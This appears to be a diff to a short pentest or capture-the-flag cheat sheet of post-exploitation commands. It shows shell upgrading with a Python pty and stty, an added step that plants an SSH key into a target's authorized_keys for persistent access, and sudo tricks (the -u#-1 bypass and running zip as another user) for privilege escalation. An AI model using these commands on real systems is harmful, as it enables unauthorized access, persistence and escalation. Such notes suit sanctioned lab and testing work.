@@ -8,10 +8,12 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 export SHELL=bash
 export TERM=xterm-256color
 
-
 CTRL + Z
 stty raw -echo;fg
 reset
+-----------------
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGQvOtGg1iFei0La62IoJcnK+JxlCF/E9XRRbox86Ufk mobin@solcoteh' >> /home/user/.ssh/authorized_keys # in target
+ssh user@10.10.10.10 -i id_rsa  # in our system 
 -----------------
 sudo -u#-1 /bin/bash
 sudo -u silvio /usr/bin/zip # run with another user
